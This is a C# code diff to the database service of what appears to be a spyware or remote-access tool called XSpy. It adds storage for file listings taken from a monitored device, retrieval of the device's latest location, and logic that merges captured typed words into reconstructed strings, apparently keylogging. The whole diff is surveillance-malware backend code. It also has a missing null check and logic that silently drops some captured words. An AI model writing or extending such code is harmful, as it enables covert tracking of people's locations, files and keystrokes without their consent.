@@ -79,6 +79,23 @@ namespace XSpy.Database.Services
         {
             return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id);
         }
+        public Task<List<TempPath>> GetPathsForDevice(Guid id)
+        {
+            return DbContext.TempPaths.Where(s=>s.DeviceId == id).Select(s=> new TempPath()
+            {
+                CanRead = s.CanRead,
+                Name = s.Name,
+                IsDir = s.IsDir,
+                Parent = s.Parent,
+                Path = s.Path
+            }).ToListAsync();
+        }
+
+        public Task<Location> GetLatestLocation(Guid deviceId)
+        {
+            return DbContext.Locations.OrderByDescending(s => s.CratedAt)
+                .FirstOrDefaultAsync(s => s.DeviceId == deviceId);
+        }
 
         public async Task DisconnectDevice(string deviceId)
         {
@@ -155,6 +172,38 @@ namespace XSpy.Database.Services
             }
 
 
+            await DbContext.SaveChangesAsync();
+        }
+
+        public async Task ListPath(string deviceId, List<LoadPathData> paths)
+        {
+            var device =
+                await DbContext.Devices.Where(s => s.DeviceId == deviceId)
+                    .FirstOrDefaultAsync();
+            if (device.Id == Guid.Empty)
+                return;
+
+            device.IsLoadingDir = false;
+            DbContext.Update(device);
+            
+            DbContext.TempPaths.RemoveRange(DbContext.TempPaths.Where(s => s.DeviceId == device.Id));
+            foreach (var pathData in paths)
+            {
+                var data = new TempPath()
+                {
+                    Id = Guid.NewGuid(),
+                    CratedAt = DateTime.Now,
+                    DeviceId = device.Id,
+                    CanRead = pathData.CanRead,
+                    IsDir = pathData.IsDir,
+                    Name = pathData.Name,
+                    Path = pathData.Path,
+                    Parent = pathData.Parent
+                };
+
+                await DbContext.AddAsync(data);
+            }
+            
             await DbContext.SaveChangesAsync();
         }
 
@@ -379,16 +428,34 @@ namespace XSpy.Database.Services
                     .FirstOrDefaultAsync();
             if (device == Guid.Empty)
                 return;
-            var clip = new Clipboard()
-            {
-                Id = Guid.NewGuid(),
-                DeviceId = device,
-                CratedAt = DateTime.Now,
-                Content = word,
-                IsClipboard = isClipboard
-            };
 
-            await DbContext.Clipboards.AddAsync(clip);
+            var lastWord = await 
+                DbContext.Clipboards.Where(s => !s.IsClipboard && s.DeviceId == device).OrderByDescending(s=>s.CratedAt).FirstOrDefaultAsync();
+            if (lastWord != null && lastWord.CratedAt.AddMinutes(2) >= DateTime.Now)
+            {
+                if (word.StartsWith(lastWord.Content))
+                {
+                    lastWord.Content = word;
+                    lastWord.CratedAt = DateTime.Now;
+                    
+                    DbContext.Clipboards.Update(lastWord);
+                }
+            }
+            else
+            {
+
+                var clip = new Clipboard()
+                {
+                    Id = Guid.NewGuid(),
+                    DeviceId = device,
+                    CratedAt = DateTime.Now,
+                    Content = word,
+                    IsClipboard = isClipboard
+                };
+
+                await DbContext.Clipboards.AddAsync(clip);
+            }
+
             await DbContext.SaveChangesAsync();
         }
 
